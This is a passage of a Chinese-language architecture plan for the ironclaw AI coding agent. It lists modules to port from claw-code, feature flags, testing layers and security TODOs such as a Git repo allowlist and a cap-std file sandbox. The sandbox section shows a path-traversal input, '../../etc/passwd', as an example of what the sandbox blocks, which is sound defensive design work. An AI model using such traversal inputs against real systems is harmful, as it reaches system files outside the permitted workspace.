| `runtime/src/usage.rs` | Token 计费增强 | 移植：ModelPricing + cache 维度费用拆分 |
| `runtime/src/mcp_lifecycle_hardened.rs` | MCP 子系统错误诊断 | 参考：11 阶段 + McpErrorSurface |
| `runtime/src/session.rs` | Thread 持久化增强 | 参考：日志轮转 + 版本化 + workspace_root 绑定 |
| `runtime/src/bootstrap.rs` | 启动优化（P3+） | 参考：12 阶段 BootstrapPlan |
| `runtime/src/green_contract.rs` | Git commit/push 门控 | 移植：4 级 GreenLevel 分级 |
| `runtime/src/trust_resolver.rs` | 工作区信任管理 | 参考：TrustPolicy + TrustConfig |
| `runtime/src/stale_base.rs` | Git stale 检测 | 移植：BaseCommitState + `.claw-base` |
| `runtime/src/branch_lock.rs` | SubAgent 分支安全 | 移植：冲突检测算法 |
| `runtime/src/config_validate.rs` | 配置加载增强 | 移植：3 类诊断 + "Did you mean?" |
| `runtime/src/plugin_lifecycle.rs` | MCP/WASM 状态管理 | 参考：8 态 PluginState + ServerHealth |
| `tests/mock_parity_harness.rs` | P3 Parity Harness 基础 | 扩展：12 场景 → 30 场景 + 安全管道断言 |

## 附录 D: Feature Flags

| Flag | 默认 | 控制 |
|------|------|------|
| `CODE_TOOLS_ENABLED` | `true` | P0 文件/搜索工具总开关 |
| `BASH_SEMANTIC_VALIDATOR_ENABLED` | `true` | Bash 第二层验证 |
| `LSP_ENABLED` | `false` | LSP 子系统（P1 后改 true） |
| `GIT_TOOLS_ENABLED` | `false` | Git 工具套件（P1 后改 true） |
| `PROMPT_LAYERING_ENABLED` | `false` | 静态/动态分层（P1 后改 true） |
| `PLAN_MODE_ENABLED` | `false` | Plan Mode（P2 后改 true） |
| `SESSION_FORK_ENABLED` | `false` | Session Fork（P2 后改 true） |
| `SUB_AGENT_ENABLED` | `false` | Sub-Agent（P2 后改 true） |
| `CLAUDE_CODE_BRIDGE_ENABLED` | `true` | Claude Code CLI 桥接（P3 后改 false） |

## 附录 E: claw-code 额外可复用能力矩阵（深度扫描）

> **背景**: 初版架构仅覆盖 claw-code 中 8 个核心模块（file_ops / bash_validation / lsp_client / permission_enforcer / task_registry / team_cron_registry / EnterPlanMode / AgentTool）。经过深度扫描，发现 35+ 额外模块的能力优于或互补于 ironclaw 现有实现。以下按**迁移优先级**分类。

### E.1 会话与运行时（应在 P0-P1 集成）

#### E.1.1 Conversation Runtime (`runtime/src/conversation.rs`)

claw-code 的 `ConversationRuntime` 拥有 ironclaw 欠缺的**精细缓存监控**和**自动压缩判定**：

| 能力 | claw-code 实现 | ironclaw 现状 | 迁移建议 |
|------|---------------|--------------|---------|
| **PromptCacheEvent** | `unexpected` 标记 + `token_drop` 追踪，检测意外缓存失 miss | 仅 `CacheRetention` 枚举，无 miss 检测 | **高优**：集成到 ironclaw CompactService，触发 cache 降级告警 |
| **Auto-Compaction 触发** | 100K token 阈值 → `AutoCompactionEvent` | 80% 阈值触发 Summarize（已有） | 参考：ironclaw 阈值可配置，但缺乏 claw-code 的 `TurnSummary.auto_compaction` 细粒度回报 |
| **AssistantEvent 类型系统** | `TextDelta/ToolUse/Usage/PromptCache/MessageStop` 带结构化 payload | SSE 事件较扁平 | **中优**：丰富 SSE event types，前端可做更精细渲染 |

#### E.1.2 Compaction 精细化 (`runtime/src/compact.rs`)

| 能力 | 详情 | 迁移建议 |
|------|------|---------|
| `CompactionConfig` | `preserve_recent=4` 轮次、`max_tokens=10K` summary 上限 | ironclaw CompactService 的 `CompactionStrategy::Summarize` 缺乏 preserve_recent 控制 — **应移植** |
| XML 标签处理 | `format_compact_summary()` 在压缩时清理 XML/CDATA 标签，避免注入 | ironclaw 无此处理 — **高优安全增强** |
| 续接提示词 | `COMPACT_CONTINUATION_PREAMBLE` + `DIRECT_RESUME_INSTRUCTION` 确保 LLM 压缩后不迷失 | ironclaw 缺失 — **应移植** |
| `estimate_session_tokens()` | 精确估算当前 session 总 token，驱动 `should_compact()` | ironclaw 使用 LLM 返回的 usage，不独立估算 — **推荐参考** |

#### E.1.3 Session 持久化 (`runtime/src/session.rs`)

| 能力 | 详情 | 迁移建议 |
|------|------|---------|
| **Session 版本化** | `SESSION_VERSION: u32 = 1`，支持未来 schema 演化 | ironclaw Thread/ConversationContext 未版本化，复杂迁移时可能出问题 — **推荐** |
| **日志轮转** | `ROTATE_AFTER_BYTES = 256KB`、`MAX_ROTATED_FILES = 3` | ironclaw 无日志轮转 — **Desktop 场景必须** |
| **SessionFork** | `parent_session_id + branch_name` 标记来源 | 架构 P2 已设计 SessionForkTool，但应参考此结构体定义 |
| **workspace_root 绑定** | session 绑定到 worktree，防止并行 lane 写错 CWD | ironclaw Thread 无此绑定 — **多 Agent 场景必须** |
| **prompt_history** | 带时间戳的用户输入历史，支持 resume | ironclaw 无独立 prompt 历史 — **推荐** |
| **ConversationMessage** | `MessageRole(System/User/Assistant/Tool)` + `ContentBlock(Text/ToolUse/ToolResult)` | ironclaw 已有类似结构，但 ContentBlock 的 `is_error` 标记更精细 |

#### E.1.4 Prompt 工程 (`runtime/src/prompt.rs`)

| 能力 | 详情 | 迁移建议 |
|------|------|---------|
| **`SYSTEM_PROMPT_DYNAMIC_BOUNDARY`** | 常量标记静态/动态层切分点，与 Claude Code 92% cache 命中率直接相关 | 架构 3.5 节已设计 `__PROMPT_CACHE_BOUNDARY__`，**应直接复用此常量名和语义** |
| **ProjectContext** | `cwd/git_status/git_diff/git_context/instruction_files` 一体化上下文 | ironclaw `build_system_prompt_with_tools()` 零散拼接 — **应结构化** |
| **instruction_files 限制** | 单文件 ≤ 4K chars、总计 ≤ 12K chars → 防止 token 暴涨 | ironclaw 无此限制 — **高优**，否则大项目 `.ironclaw/instructions/` 可能撞 token 上限 |
| **discover_with_git()** | 通过 git ls-files 发现项目指令文件，忽略 .gitignore 外的文件 | ironclaw 通过文件系统 glob 发现 — **参考优化** |

### E.2 工具执行生命周期（应在 P1-P2 集成）

#### E.2.1 Pre/Post Tool Hooks (`runtime/src/hooks.rs`)

claw-code 的 Hook 系统允许**在工具执行前后注入自定义逻辑**，类似 Git hooks：

```
HookEvent:
├─ PreToolUse   → 可返回 HookPermissionDecision (Allow/Deny/Modify)
├─ PostToolUse  → 可记录结果/触发后续 action
└─ PostToolUseFailure → 可触发自动恢复

HookRunner 支持:
├─ HookAbortSignal → 中止长时间运行的 hook
├─ HookProgressEvent → 向前端汇报 hook 执行进度
└─ 与 HookPermissionDecision 集成 → hook 可否决工具调用
```

**迁移建议**: ironclaw 的 `execute_with_safety()` 管道（DLP → Approval → Validate → Exec → Audit → Sanitize）是**固定链式管道**。claw-code 的 Hook 系统提供了**可插拔扩展点**，允许企业部署时注入自定义验证逻辑。**建议在 P2 阶段引入 Hook 机制**，作为现有安全管道的**扩展层**而非替代。

```
当前: DLP → Approval → Validate →        Exec → Audit → Sanitize
增强: DLP → Approval → Validate → [PreHook] → Exec → [PostHook] → Audit → Sanitize
```

#### E.2.2 Usage/Cost Tracking (`runtime/src/usage.rs`)

| 能力 | 详情 | 迁移建议 |
|------|------|---------|
| **ModelPricing** | 按模型族定价（Haiku/Sonnet/Opus），含 cache_creation/cache_read 拆分 | ironclaw 按 token 计费但缺少**模型级定价** — **P1 集成** |
| **UsageCostEstimate** | `input_cost_usd + output_cost_usd + cache_creation_cost_usd + cache_read_cost_usd` | ironclaw 无 cache 维度的费用拆分 — **Prompt 分层后必须** |
| **pricing_for_model()** | 根据模型名自动匹配定价 tier | ironclaw 需手动配置 — **推荐移植** |
| **summary_lines_for_model()** | 生成人可读的 token/cost 报告 | **推荐**，可用于前端 cost dashboard |

### E.3 多 Agent 编排（应在 P2-P3 集成）

#### E.3.1 Worker Boot 状态机 (`runtime/src/worker_boot.rs`)

claw-code 的 Worker 生命周期管理远比 ironclaw 的 Job 系统精细：

```
WorkerStatus 状态机（6 态）:
  Spawning → TrustRequired → ReadyForPrompt → Running → Finished
                                                     → Failed

WorkerFailureKind（5 类）:
├─ TrustGate         → 用户未信任工作区
├─ PromptDelivery    → prompt 投递失败（进程崩溃/超时）
├─ Protocol          → JSON-RPC 通信异常
├─ Provider          → LLM API 调用失败
└─ StartupNoEvidence → 启动后无任何响应
```

**迁移建议**: ironclaw Job 只有 `Pending/Running/Done/Error` 四态，缺少 `TrustRequired` 和 `ReadyForPrompt` 中间态。**Sub-Agent 场景必须引入更细粒度的状态机**。建议 P2 阶段在 `JobMode::SubAgent` 中复用此模型。

#### E.3.2 Recovery Recipes (`runtime/src/recovery_recipes.rs`)

7 个失败场景的**自动恢复策略**：

| FailureScenario | 触发条件 | RecoveryStep |
|-----------------|---------|-------------|
| `TrustPromptUnresolved` | Worker 卡在 trust prompt | `AcceptTrustPrompt` |
| `PromptMisdelivery` | prompt 投递至错误 agent | `RedirectPromptToAgent` |
| `StaleBranch` | 分支落后 main 超过 1h | `RebaseBranch` |
| `CompileRedCrossCrate` | 跨 crate 编译错误 | `CleanBuild` |
| `McpHandshakeFailure` | MCP 服务器握手超时 | `RetryMcpHandshake` |
| `PartialPluginStartup` | 部分 MCP 服务器启动失败 | 降级运行 + 通知 |
| `ProviderFailure` | LLM API 返回非预期错误 | 重试/切换模型/通知 |

**迁移建议**: ironclaw 已有 heartbeat + self-repair 机制，但缺少**结构化恢复策略库**。**建议 P2 阶段引入** `RecoveryRecipe` trait，将现有零散的错误处理统一到策略引擎。

#### E.3.3 Lane Events (`runtime/src/lane_events.rs`)

用于多 Agent 编排的**类型化可观测事件流**：

```
LaneEventName（20+ 事件）:
├─ Started / Ready / Running
├─ PromptMisdelivery / Blocked
├─ Red / Green              ← 编译/测试红绿灯
├─ CommitCreated / PrOpened / MergeReady
├─ Finished / Failed
├─ Reconciled / Merged / Superseded / Closed
└─ BranchStaleAgainstMain / BranchWorkspaceMismatch

LaneFailureClass（12 类）:
├─ Network / Provider / Permission / Configuration
├─ DiskSpace / Memory / Timeout / Protocol
├─ Conflict / StaleBranch / PluginFailure / Unknown
```

**迁移建议**: ironclaw Job 系统的事件上报较简单（成功/失败/日志）。**当 Sub-Agent + Plan Mode 落地后（P2+），必须引入更丰富的事件分类**，前端 JobsPanel 才能做精细展示。建议 P2 后半程集成。

#### E.3.4 Policy Engine (`runtime/src/policy_engine.rs`)

编排级策略规则引擎，决定何时合并/恢复/上报/关闭 lane：

```
PolicyRule = {name, condition: PolicyCondition, action: PolicyAction, priority}

PolicyCondition（可组合）:
├─ And(Vec<PolicyCondition>)
├─ Or(Vec<PolicyCondition>)
├─ GreenAt { level }        ← 绿灯等级达标
├─ StaleBranch              ← 分支过期（>1h）
├─ StartupBlocked           ← 启动被阻塞
├─ LaneCompleted / LaneReconciled / ReviewPassed / ScopedDiff / TimedOut

PolicyAction:
├─ MergeToDev / MergeForward / RecoverOnce
├─ Escalate { reason } / CloseoutLane / CleanupSession
├─ Reconcile { reason: AlreadyMerged|Superseded|EmptyDiff|ManualClose }
├─ Notify { channel } / Block { reason }
└─ Chain(Vec<PolicyAction>)  ← 组合多个动作
```

**迁移建议**: 这是 claw-code **最成熟的编排组件之一**。ironclaw 无对应能力。**建议 P3 或 P3+ 阶段引入**，作为 Routine 引擎的"升级版"——Routine 是定时触发，PolicyEngine 是**条件驱动的自动化编排**。

#### E.3.5 Green Contract (`runtime/src/green_contract.rs`)

4 级安全分级系统，确保代码在合并前通过足够的验证：

```
GreenLevel 阶梯:
  TargetedTests < Package < Workspace < MergeReady

GreenContract:
├─ required_level: GreenLevel    ← 目标等级
├─ evaluate(observed) → GreenContractOutcome::Satisfied | Unsatisfied
└─ is_satisfied_by(level) → bool
```

**迁移建议**: ironclaw 无代码质量分级概念。当 Git 工具上线（P1）+ Plan Mode 上线（P2）后，**Green Contract 可以作为** "Agent 是否允许自动 commit/push" 的**门控条件**。建议 P2+ 集成。

### E.4 安全与可靠性（应在 P0-P1 集成）

#### E.4.1 Trust Resolver (`runtime/src/trust_resolver.rs`)

| 能力 | 详情 | 迁移建议 |
|------|------|---------|
| **TrustPolicy** | `AutoTrust/RequireApproval/Deny`，3 级信任策略 | ironclaw 无工作区信任概念 — **Desktop 场景高优** |
| **TrustConfig** | `allowlisted/denied` 路径列表 | 可以对接 Admin Backend 的工作区路径白名单 |
| **Trust Prompt 检测** | 分析屏幕文本中的 trust prompt cue（5 种模式） | 适用于 CLI/terminal 模式，Desktop 可简化为配置驱动 |

#### E.4.2 Stale Base Detection (`runtime/src/stale_base.rs`)

| 能力 | 详情 | 迁移建议 |
|------|------|---------|
| **BaseCommitState** | `Matches/Diverged/NoExpectedBase/NotAGitRepo` | **Git 工具（P1）上线时直接集成** |
| **`.claw-base` 文件** | 在工作目录中存放期望 base commit | 可作为 `.ironclaw-base` 移植 |
| **resolve_expected_base()** | `--base-commit` flag 优先，回退读 `.claw-base` | Git stale 检测的标准实现 — **直接参考** |

#### E.4.3 Branch Lock (`runtime/src/branch_lock.rs`)

| 能力 | 详情 | 迁移建议 |
|------|------|---------|
| **BranchLockIntent** | `lane_id + branch + worktree + modules` | 多 Agent 并行编码时的分支冲突检测 |
| **collision detection** | 检测两个 lane 在同一 branch + 同一 module 的冲突 | **Sub-Agent（P2）上线后必须** |
| **module overlap** | 路径前缀匹配判断模块重叠 | 比简单的文件锁更精细 |

#### E.4.4 MCP Lifecycle Hardened (`runtime/src/mcp_lifecycle_hardened.rs`)

claw-code 的 MCP 生命周期管理远比 ironclaw 现有的精细：

```
McpLifecyclePhase（11 阶段）:
  ConfigLoad → ServerRegistration → SpawnConnect → InitializeHandshake
  → ToolDiscovery → ResourceDiscovery → Ready → Invocation
  → ErrorSurfacing → Shutdown → Cleanup

McpPhaseResult: Success { phase, duration } | Failure { phase, error } | Timeout { phase, waited, error }

McpErrorSurface:
├─ phase: McpLifecyclePhase    ← 哪个阶段出错
├─ server_name: Option<String> ← 哪个 MCP 服务器
├─ message + context           ← 错误详情
├─ recoverable: bool           ← 是否可恢复
└─ timestamp: u64              ← 发生时间
```

**迁移建议**: ironclaw MCP 子系统已支持 3 种传输，但**错误诊断和生命周期追踪**不如 claw-code 精细。**建议 P1 阶段增强 MCP 错误上报**，参考 `McpErrorSurface` 结构，向前端提供更好的 MCP 故障排查体验。

#### E.4.5 Plugin Lifecycle (`runtime/src/plugin_lifecycle.rs`)

| 能力 | 详情 | 迁移建议 |
|------|------|---------|
| **PluginState** | 8 态：`Unconfigured→Validated→Starting→Healthy→Degraded→Failed→ShuttingDown→Stopped` | ironclaw MCP/WASM 扩展缺少这种粒度的状态机 |
| **ServerHealth** | 每个 MCP 服务器独立健康状态 (`Healthy/Degraded/Failed`) | ironclaw 目前是 binary（connected/disconnected） |
| **自动降级** | `from_servers()` 自动从 server 列表推导整体状态 | 部分 server 失败时不完全宕机 — **高可靠场景必须** |

#### E.4.6 Config Validation (`runtime/src/config_validate.rs`)

| 能力 | 详情 | 迁移建议 |
|------|------|---------|
| **ConfigDiagnostic** | 3 类诊断：`UnknownKey(+suggestion)/WrongType/Deprecated` | ironclaw 配置错误只有 panic/log — **用户体验差** |
| **"Did you mean?"** | 未知 key 自动建议最接近的合法 key | **高体验**，应在 P0 集成到 config 加载 |
| **Deprecated 提示** | 标记弃用字段 + 给出替代方案 | 版本迁移友好 — **推荐** |

### E.5 启动与诊断（P1+ 集成）

#### E.5.1 Bootstrap Sequence (`runtime/src/bootstrap.rs`)

12 阶段快速启动序列：

```
BootstrapPlan::claude_code_default():
  CliEntry → FastPathVersion → StartupProfiler
  → SystemPromptFastPath → ChromeMcpFastPath → DaemonWorkerFastPath
  → BridgeFastPath → DaemonFastPath → BackgroundSessionFastPath
  → TemplateFastPath → EnvironmentRunnerFastPath → MainRuntime
```

**迁移建议**: ironclaw Desktop Client 启动通过 `EngineRunner` 线性初始化。claw-code 的 `BootstrapPlan` 支持**阶段去重和自定义排列**，适合将来的"快速启动模式"（跳过 MCP 初始化直接进入聊天）。**建议 P3+ 参考**。

### E.6 能力优先级矩阵总结

| 迁移阶段 | 来源模块 | 集成目标 | 优先级理由 |
|---------|---------|---------|-----------|
| **P0** | `compact.rs` (XML清理, 续接提示) | CompactService 增强 | 压缩质量直接影响对话连贯性 |
| **P0** | `config_validate.rs` (诊断) | 配置加载增强 | 用户体验 + 减少配置错误 |
| **P0** | `prompt.rs` (instruction限制) | build_system_prompt | 防 token 暴涨 — 安全 |
| **P1** | `conversation.rs` (PromptCacheEvent) | Prompt 分层监控 | cache 命中率是 P1 核心指标 |
| **P1** | `usage.rs` (ModelPricing) | Token 计费增强 | Prompt 分层后必须有 cache 维度费用 |
| **P1** | `stale_base.rs` | Git 工具集成 | Git stale 检测是 P1 交付物 |
| **P1** | `mcp_lifecycle_hardened.rs` (错误上报) | MCP 子系统增强 | MCP 诊断体验提升 |
| **P1** | `plugin_lifecycle.rs` (PluginState) | MCP/WASM 状态管理 | 连接状态精细化 |
| **P2** | `hooks.rs` (Pre/Post Hook) | 安全管道扩展 | 企业自定义验证入口 |
| **P2** | `worker_boot.rs` (6 态状态机) | SubAgent 生命周期 | Sub-Agent 精细状态管理 |
| **P2** | `recovery_recipes.rs` (7 恢复策略) | self-repair 增强 | 自动恢复策略库 |
| **P2** | `branch_lock.rs` (冲突检测) | Sub-Agent 分支安全 | 多 Agent 并行编码必须 |
| **P2** | `green_contract.rs` (4 级分级) | Git commit/push 门控 | 代码质量自动门禁 |
| **P2** | `trust_resolver.rs` | 工作区信任管理 | Desktop 安全 |
| **P2+** | `lane_events.rs` (20+ 事件) | Job/SubAgent 可观测 | 前端精细展示 |
| **P3+** | `policy_engine.rs` (编排规则) | Routine 引擎升级 | 条件驱动自动化编排 |
| **P3+** | `bootstrap.rs` (12 阶段) | 快速启动模式 | 启动优化 |
| **P3+** | `session.rs` (日志轮转/版本化) | Thread 持久化增强 | 长期运行稳定性 |

---

## 附录 G: Parity Harness 评估层级 (TODO)

### 当前完成: Layer 1 — Scripted Scenario Testing

通过预编程 LLM 响应 + 真实工具执行，验证 50 个行为/安全场景（47 通过，3 ignored）。
覆盖：功能 parity (30)、路径安全 (5)、Bash 安全 (5)、输出安全 (5)、企业安全 (5)。

### 未来: Layer 2 — Recording & Replay

**目标**: 录制真实 Claude Code 会话 trace，在 ironclaw 上原样回放，对比工具调用序列和结果差异。

**关键组件**:
- **Trace Recorder**: 拦截 Claude Code CLI 的 API 请求/响应，序列化为 JSON trace 文件
- **Replay Engine**: 将 trace 中的 LLM 响应注入 ScriptedLlm，驱动 ironclaw agentic loop
- **Diff Reporter**: 对比两端的工具调用序列、参数、输出、耗时

**价值**: 从"场景设计者认为应该这样"升级到"真实 Claude Code 确实这样做"。

### 未来: Layer 3 — Live A/B Testing

**目标**: 同一用户请求同时发送给 Claude Code 和 ironclaw，实时对比输出质量和行为一致性。

**关键组件**:
- **A/B Router**: 按比例（如 10%）将请求同时路由到两个后端
- **Quality Evaluator**: 自动评估代码正确性、工具调用效率、token 消耗
- **Dashboard**: 可视化 parity score 趋势、regression 告警

**价值**: 持续监控生产环境中的 parity drift，而非依赖离线快照。

---

## 附录 H: 待实现安全增强 (TODO)

### TODO: Git Repo 白名单

**优先级**: P1（随 Git 工具套件一起交付）

**目标**: 控制 AI Agent 可交互的 Git 远程仓库范围，防止代码通过 push/clone 泄露到非授权仓库。

**设计要点**:
- 数据库侧已就绪：`028_lsp_server_settings.sql` 含 `git_repos` setting type
- 白名单为空 = 允许任何仓库；非空 = 只允许匹配的 URL pattern
- `push_requires_approval: true` — push 操作需人工审批
- `commit_dlp_scan: true` — commit 内容经 DLP 引擎扫描
- **Threat model**: 防 AI Agent 无人监督推送，不防人类用户的 `git push`（后者属 Git 服务端 hook / 网络策略范畴）

**集成点**:
- `GitPushTool` / `GitCommitTool` 执行前检查 remote URL 是否在白名单内
- Admin Backend `/api/settings/git-repos` GET/PUT 已在 API 表中规划

### TODO: cap-std Capability-Based 文件沙箱

**优先级**: P2（路径安全长期演进方案）

**目标**: 用 `cap-std` 的 capability-based 文件系统替代当前基于路径字符串校验的沙箱机制，从根源消灭路径逃逸。

**现状**:
- 当前 `validate_path()` 通过 `normalize_lexical()` + `starts_with(base_canonical)` 校验
- 已有 null byte、URL 编码、symlink 追踪防护
- **弱点**: 依赖路径字符串分析，无法防御所有 TOCTOU 和 Unicode confusable 攻击

**cap-std 方案**:
```rust
use cap_std::fs::Dir;
// 创建一个 Dir 对象代表工作区——后续所有操作只能在此子树内
let workspace = Dir::open_ambient_dir(&workspace_path, cap_std::ambient_authority())?;
// 无论传什么路径，都无法逃逸出 workspace
workspace.open("../../etc/passwd"); // → Error
```

**迁移路径**: 先作为 `validate_path()` 的可选后端引入，逐步替换字符串校验逻辑。
